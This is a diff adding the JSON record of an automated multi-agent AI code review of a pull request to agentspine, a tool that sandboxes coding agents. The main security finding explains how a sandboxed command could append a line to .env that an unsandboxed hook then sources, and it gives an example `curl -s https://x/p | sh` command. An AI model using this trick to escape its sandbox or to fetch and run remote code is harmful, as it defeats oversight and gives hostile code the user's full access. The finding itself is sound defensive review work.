@@ -1,0 +1,155 @@
+{
+  "schema_version": 3,
+  "timestamp": "2026-10-18T15:24:17.646Z",
+  "repository": "AlexisBalayre/agentspine",
+  "run_id": "39139946200",
+  "run_url": "https://github.com/AlexisBalayre/agentspine/actions/runs/39139946200",
+  "actor": "AlexisBalayre",
+  "commit_sha": "24fa417e4b4159810b4d9fe70faf05ca05c7d05c",
+  "source": "pr",
+  "pr_number": 42,
+  "action": "review",
+  "reviewers_spawned": [
+    "correctness",
+    "security",
+    "context",
+    "conventions",
+    "maintainability",
+    "docs"
+  ],
+  "reviewers_returned": [
+    "correctness",
+    "security",
+    "context",
+    "conventions",
+    "maintainability",
+    "docs"
+  ],
+  "reviewers_skipped": [
+    "spec"
+  ],
+  "review_mode": "full",
+  "incremental_from_sha": null,
+  "review_depth": "standard",
+  "review_areas": [],
+  "prior_importants": [],
+  "findings": [
+    {
+      "file": "docs/design/0001-architecture.md",
+      "line": "1048-1049",
+      "area": "security",
+      "confidence": "high",
+      "tag": "important",
+      "description": "Before every Bash call, the git-safety PreToolUse hook sources `$CLAUDE_PROJECT_DIR/.env` outside the sandbox. `.env` is not in `denyWrite` and is not a protected path, so a sandboxed command can still pick what the next hook runs with the user's full access. Decision 34 says it closes this threat and does not list `.env` under \"Not closed here\".",
+      "body": "**A sandboxed command can still choose what an unsandboxed hook runs, through `.env`**\n\nDecision 34 closes \"a sandboxed command could rewrite a policy or a gate command, and the next hook would run it unsandboxed\" by denying writes to `./.agents`. But the git-safety policy, which Claude Code runs as a `PreToolUse` hook on **every** Bash call (`claudeHooks` in `src/plan.utils.ts`, matcher `Bash`), executes a file that sits outside `.agents/`:\n\n<https://github.com/AlexisBalayre/agentspine/blob/24fa417e4b4159810b4d9fe70faf05ca05c7d05c/templates/agents/hooks/policies/git-safety.sh#L10-L16>\n\n```sh\nPROJECT_DIR=\"${AGENT_PROJECT_DIR:-.}\"\nif [ -f \"$PROJECT_DIR/.env\" ]; then\n  set -a\n  . \"$PROJECT_DIR/.env\"\n  set +a\nfi\n```\n\n`claude-shaped.sh` sets `AGENT_PROJECT_DIR` from `$CLAUDE_PROJECT_DIR`. `.env` is at the project root. It is not in `denyWrite`, and it is not among the protected paths the PR's own matrix section lists for Claude Code. So `printf 'curl -s https://x/p | sh\\n' >> .env` from a sandboxed command runs with the user's full access on the next Bash call. `.env` is gitignored, so the change also does not show in `git status`. The \"Not closed here\" bullet names only linter and type-checker configs, so the CHANGELOG and README claim more protection than the config gives. That conflicts with AGENTS.md: \"Never claim parity a tool does not have... Silent degradation is the failure mode this project exists to avoid.\"\n\n<https://github.com/AlexisBalayre/agentspine/blob/24fa417e4b4159810b4d9fe70faf05ca05c7d05c/docs/design/0001-architecture.md#L1048-L1049>\n\nThere are two ways to fix this. One is to have git-safety read only `GIT_TRUNK` from `.env` instead of sourcing the whole file. The other, if that is out of scope here, is to record `.env` under \"Not closed here\" and soften the CHANGELOG and README wording.",
+      "suggestion": null
+    },
+    {
+      "file": "src/plan.utils.ts",
+      "line": "145-148",
+      "area": "docs",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The comment here and decision 34 justify emitting the deny with `--skip-hooks` because skills load \"through the .claude/skills link\", but with `--no-symlink` (or when linking fails) `.claude/skills` is a copy, so that reason only holds in link mode. Consider \"when it is one\".",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/design/0001-architecture.md",
+      "line": "1048-1049",
+      "area": "security",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "\"Not closed here\" mentions only linter and type-checker configs. The gate commands agentspine infers also run other project files a sandboxed command can rewrite: `package.json` scripts (`pnpm typecheck`), `build.rs` (`cargo check`), and `node_modules/.bin` (`npx tsc`). Consider naming those too.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/capability-matrix.md",
+      "line": "117-124",
+      "area": "context",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The macOS probe on sandbox-runtime 0.0.80 is an experiment rather than a doc citation, and the Sources list pins sandbox-runtime only by commit `626a596`. Record the probe (date, platform) in Sources and map 0.0.80 to a commit.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/capability-matrix.md",
+      "line": "304-314",
+      "area": "docs",
+      "confidence": "high",
+      "tag": "nit",
+      "description": "The new Sources bullets use em-dashes (` — `). The docs style guide bars them in new prose, so use a colon or comma instead.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "test/init.test.ts",
+      "line": "73-95",
+      "area": "maintainability",
+      "confidence": "medium",
+      "tag": "nit",
+      "description": "The `[\"./.agents\"]` deny list is repeated as a literal in three assertions, while `CLAUDE_SANDBOX` in `src/plan.utils.ts` is the unexported source of truth. Keeping the literal is defensible because it pins the emitted contract. Hoist one constant only if the path is likely to change.",
+      "body": null,
+      "suggestion": null
+    },
+    {
+      "file": "docs/capability-matrix.md",
+      "line": "5",
+      "area": "context",
+      "confidence": "medium",
+      "tag": "pre-existing",
+      "description": "The matrix header still says \"Verified: 2026-09-14\", but sections (including the new one) are dated as late as 2026-10-18. This was already out of step before this PR.",
+      "body": null,
+      "suggestion": null
+    }
+  ],
+  "refuted_findings": [],
+  "process_issues": [],
+  "comments_posted_actual": 1,
+  "is_error": false,
+  "incomplete_reason": null,
+  "cost_usd": 2.4497815000000003,
+  "duration_ms": 245898,
+  "num_turns": 13,
+  "tokens": {
+    "input": 14,
+    "output": 12270,
+    "cache_read": 290769,
+    "cache_creation": 48764,
+    "total": 351817
+  },
+  "model_usage": [
+    {
+      "model": "claude-opus-5-5",
+      "input": 80,
+      "output": 37081,
+      "cache_read": 1440128,
+      "cache_creation": 187522,
+      "cost_usd": 2.1138676
+    },
+    {
+      "model": "claude-sonnet-5-5",
+      "input": 30,
+      "output": 8466,
+      "cache_read": 281939,
+      "cache_creation": 89200,
+      "cost_usd": 0.33591390000000004
+    }
+  ],
+  "permission_denials": [
+    {
+      "tool": "Bash",
+      "input": "ls -la .agents .claude-pr-agents/.agents 2>&1; ls -la .claude-pr-agents; git ls-tree HEAD .agents/ ; ls vitest.config.* package.json; cat vitest.config.* 2>/dev/null; grep -n '\"test' package.json"
+    },
+    {
+      "tool": "Bash",
+      "input": "git show 24fa417:docs/design/0001-architecture.md | grep -n \"Not closed here\\|sandboxed command could rewrite\\|Hooks run outside\\|^## 34\" ; git show 24fa417:CHANGELOG.md | grep -n \"denies sandboxed\"; "
+    },
+    {
+      "tool": "Bash",
+      "input": "git -C /home/runner/work/agentspine/agentspine diff a983ebe85599ac20b0dfa007e18913fc7e305914..HEAD --stat"
+    }
+  ]
+}
